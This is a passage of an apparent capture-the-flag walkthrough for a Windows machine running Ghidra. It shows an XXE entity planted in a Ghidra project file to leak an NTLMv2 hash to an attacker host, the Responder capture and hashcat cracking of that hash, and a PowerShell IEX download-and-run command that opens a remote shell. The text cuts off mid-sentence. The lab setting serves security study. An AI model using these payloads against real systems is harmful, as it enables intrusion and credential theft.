<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">brew cask install ghidra
ghidraRun
cat xxe.rep/project.prp
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#ff79c6">&lt;FILE_INFO&gt;</span>
    <span style="color:#ff79c6">&lt;BASIC_INFO&gt;</span>
        <span style="color:#ff79c6">&lt;STATE</span> <span style="color:#50fa7b">NAME=</span><span style="color:#f1fa8c">&#34;OWNER&#34;</span> <span style="color:#50fa7b">TYPE=</span><span style="color:#f1fa8c">&#34;string&#34;</span> <span style="color:#50fa7b">VALUE=</span><span style="color:#f1fa8c">&#34;username&#34;</span> <span style="color:#ff79c6">/&gt;</span>
    <span style="color:#ff79c6">&lt;/BASIC_INFO&gt;</span>
<span style="color:#ff79c6">&lt;/FILE_INFO&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We edit the file to make our exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span style="color:#ff79c6">&lt;!DOCTYPE aaa [
</span><span style="color:#ff79c6">&lt;!ENTITY % dtd SYSTEM &#34;//10.10.14.73/i&#34;&gt;</span>
%dtd;
]&gt;
<span style="color:#ff79c6">&lt;FILE_INFO&gt;</span>
    <span style="color:#ff79c6">&lt;BASIC_INFO&gt;</span>
        <span style="color:#ff79c6">&lt;STATE</span> <span style="color:#50fa7b">NAME=</span><span style="color:#f1fa8c">&#34;OWNER&#34;</span> <span style="color:#50fa7b">TYPE=</span><span style="color:#f1fa8c">&#34;string&#34;</span> <span style="color:#50fa7b">VALUE=</span><span style="color:#f1fa8c">&#34;i&#34;</span> <span style="color:#ff79c6">/&gt;</span>
    <span style="color:#ff79c6">&lt;/BASIC_INFO&gt;</span>
<span style="color:#ff79c6">&lt;/FILE_INFO&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We create a zip project archive as indicated by the Ghidra post: <code>zip -r ../ghidra_xxe_smb_fs.zip ./*</code> and we place it inside our python webserver</p>
<p>If we run <code>PS C:\proj_drop&gt; wget -o g.zip http://10.10.14.73:8080/ghidra_xxe_smb_fs.zip</code>,
Responder will give us coby password hash.
Note that this will work as well if we change the string with backward slash: &ldquo;\10.10.14.73\i&rdquo; or &ldquo;\\10.10.14.73\i&rdquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Listening <span style="color:#ff79c6">for</span> events...

<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Client   : 10.10.10.144
<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Username : RE<span style="color:#f1fa8c">\c</span>oby
<span style="color:#ff79c6">[</span>SMB<span style="color:#ff79c6">]</span> NTLMv2-SSP Hash     : coby::RE:b1abcf60d6d97be7:8C6F4BD258951C9B6DE62C9F867BB44D:0101000000000000C0653150DE09D201EA31965E873AF1AE000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000A937185F9D8BE12DC1461140265EB6CA543BFBFE1765CEFB7733FCC5D6BF30D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0037003300000000000000000000000000
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Skipping previously captured <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">for</span> RE<span style="color:#f1fa8c">\c</span>oby
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Skipping previously captured <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">for</span> RE<span style="color:#f1fa8c">\c</span>oby
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Skipping previously captured <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">for</span> RE<span style="color:#f1fa8c">\c</span>oby
<span style="color:#ff79c6">[</span>FTP<span style="color:#ff79c6">]</span> Cleartext Client   : 10.10.10.144
<span style="color:#ff79c6">[</span>FTP<span style="color:#ff79c6">]</span> Cleartext Username : anonymous
<span style="color:#ff79c6">[</span>FTP<span style="color:#ff79c6">]</span> Cleartext Password : Java11.0.2@
</code></pre></td></tr></table>
</div>
</div><p>We can also change our payload to &ldquo;http://10.10.14.73:8002/i&rdquo;, to observe a HTTP get request on port 8002</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:/$ rlwrap nc -lnvp <span style="color:#bd93f9">8002</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8002</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">64827</span>
GET /i HTTP/1.1
User-Agent: Java/11.0.2
Host: 10.10.14.73:8002
Accept: text/html, image/gif, image/jpeg, *; <span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>.2, */*; <span style="color:#8be9fd;font-style:italic">q</span><span style="color:#ff79c6">=</span>.2
Connection: keep-alive
</code></pre></td></tr></table>
</div>
</div><p>We wget <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou.txt</a> dictionary to recover coby password:
We use hashcat against rockyou</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashcat --force -m <span style="color:#bd93f9">5600</span> re.ntlmv2  /opt/dictionaries/rockyou.txt
COBY::RE:b1abcf60d6d97be7:8c6f4bd258951c9b6de62c9f867bb44d:0101000000000000c0653150de09d201ea31965e873af1ae000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000a937185f9d8be12dc1461140265eb6ca543bfbfe1765cefb7733fcc5d6bf30d40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003300000000000000000000000000:championship2005
</code></pre></td></tr></table>
</div>
</div><p>We can try to connect with python3-impacket but user coby is not authorized SVCManager.</p>
<p>So we have to login as coby from an already opened Powershell session by creating a SecureString shell connection:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; <span style="color:#8be9fd;font-style:italic">$pass</span> <span style="color:#ff79c6">=</span> convertto-securestring <span style="color:#f1fa8c">&#39;championship2005&#39;</span> -asplain -force
PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; <span style="color:#8be9fd;font-style:italic">$pass</span>
System.Security.SecureString
PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; <span style="color:#8be9fd;font-style:italic">$cred</span> <span style="color:#ff79c6">=</span> new-object system.management.automation.pscredential<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;.\coby&#39;</span>, <span style="color:#8be9fd;font-style:italic">$pass</span><span style="color:#ff79c6">)</span>
PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; <span style="color:#8be9fd;font-style:italic">$cred</span>

UserName                     Password
--------                     --------
.<span style="color:#f1fa8c">\c</span>oby   System.Security.SecureString

PS C:<span style="color:#f1fa8c">\p</span>roj_drop&gt; invoke-command -computer re -credential <span style="color:#8be9fd;font-style:italic">$cred</span> -scriptblock <span style="color:#ff79c6">{</span>IEX<span style="color:#ff79c6">(</span>new-object net.webclient<span style="color:#ff79c6">)</span>.downloadstring<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;http://10.10.14.73:8080/iis.ps1&#39;</span><span style="color:#ff79c6">)}</span>
</code></pre></td></tr></table>
</div>
</div><p>And we get a shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@6274ae97a895:/$ nc -lnvp <span style="color:#bd93f9">8001</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8001</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">65227</span>
Windows PowerShell running as user coby on RE
Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\c</span>oby<span style="color:#f1fa8c">\D</span>ocuments&gt; whoami
re<span style="color:#f1fa8c">\c</span>oby
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\c</span>oby<span style="color:#f1fa8c">\D</span>ocuments&gt; <span style="color:#8be9fd;font-style:italic">type</span> process_projects.ps1
</code></pre></td></tr></table>
</div>
</div><p>We can now observe the source code of script launching ghidra:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#8be9fd;font-style:italic">$dropbox</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;C:\proj_drop&#34;</span>
<span style="color:#8be9fd;font-style:italic">$proj_dir</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;C:\users\coby\ghidra_projects\import&#34;</span>
<span style="color:#8be9fd;font-style:italic">$ghidra_bat</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;C:\users\coby\ghidra_9.0\ghidraRun.bat&#34;</span>
<span style="color:#8be9fd;font-style:italic">$ghidra_config</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;C:\Users\coby\.ghidra\.ghidra-9.0\preferences&#34;</span>

<span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$true</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
        Get-ChildItem <span style="color:#8be9fd;font-style:italic">$dropbox</span> | ForEach-Object <span style="color:#ff79c6">{</span>

                <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$_</span>.Extension -eq <span style="color:#f1fa8c">&#34;.zip&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>

            Remove-Item <span style="color:#8be9fd;font-style:italic">$proj_dir</span><span style="color:#f1fa8c">\*</span> -Recurse -Force

            Expand-Archive -LiteralPath <span style="color:#8be9fd;font-style:italic">$_</span>.fullname -DestinationPath <span style="color:#8be9fd;font-style:italic">$proj_dir</span>

                    <span style="color:#6272a4"># get project name</span>
                    Get-ChildItem -Path <span style="color:#8be9fd;font-style:italic">$proj_dir</span> -filter *.rep | ForEach-Object <span style="color:#ff79c6">{</span>
                                <span style="color:#8be9fd;font-style:italic">$proj_name</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_</span>.name -replace <span style="color:#f1fa8c">&#34;.rep&#34;</span>,<span style="color:#f1fa8c">&#34;&#34;</span>
                                <span style="color:#8be9fd;font-style:italic">$last_open</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;LastOpenedProject=</span><span style="color:#8be9fd;font-style:italic">$proj_dir</span><span style="color:#f1fa8c">\$proj_name&#34;</span>
                <span style="color:#8be9fd;font-style:italic">$proj_prp</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;{0}\{1}.rep\project.prp&#39;</span> -f <span style="color:#8be9fd;font-style:italic">$proj_dir</span>, <span style="color:#8be9fd;font-style:italic">$proj_name</span>
                <span style="color:#ff79c6">if</span><span style="color:#ff79c6">([</span>System.IO.File<span style="color:#ff79c6">]</span>::Exists<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">$proj_prp</span><span style="color:#ff79c6">))</span> <span style="color:#ff79c6">{</span>

                            <span style="color:#6272a4">#replace name in $ghidra config</span>
                            Get-Content <span style="color:#8be9fd;font-style:italic">$ghidra_config</span> | findstr /v LastOpenedProject | Set-Content <span style="color:#8be9fd;font-style:italic">$ghidra_config</span>
                            <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$last_open</span><span style="color:#ff79c6">)</span> -replace <span style="color:#f1fa8c">&#34;\\&#34;</span>,<span style="color:#f1fa8c">&#34;\\&#34;</span> | Out-File -encoding ASCII -append <span style="color:#8be9fd;font-style:italic">$ghidra_config</span>

                                        <span style="color:#6272a4"># run project</span>
                            <span style="color:#8be9fd;font-style:italic">$ghidra</span> <span style="color:#ff79c6">=</span> Start-Process -passthru <span style="color:#8be9fd;font-style:italic">$ghidra_bat</span>
                            Start-Sleep <span style="color:#bd93f9">50</span>
                            stop-process -force -name javaw
                <span style="color:#ff79c6">}</span>
            <span style="color:#ff79c6">}</span>
                <span style="color:#ff79c6">}</span>

                Remove-Item -Path <span style="color:#8be9fd;font-style:italic">$_</span>.fullname

        <span style="color:#ff79c6">}</span>

        Start-Sleep <span style="color:#bd93f9">2</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We can now get the root flag</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\coby&gt; <span style="color:#8be9fd;font-style:italic">cd </span>\Users
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users&gt; <span style="color:#8be9fd;font-style:italic">cd </span>Administrator
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\Administrator&gt; <span style="color:#8be9fd;font-style:italic">cd </span>Desktop
<span style="color:#8be9fd;font-style:italic">PS </span>C:\Users\Administrator\Desktop&gt; <span style="color:#8be9fd;font-style:italic">type </span>root.txt
</code></pre></td></tr></table>
</div>
</div><h1 id="unintended-exploitation-path">Unintended exploitation path</h1>
<p>There is an unintended exploit that allows to by-pass the yara rules check at the condition that the user belongs to
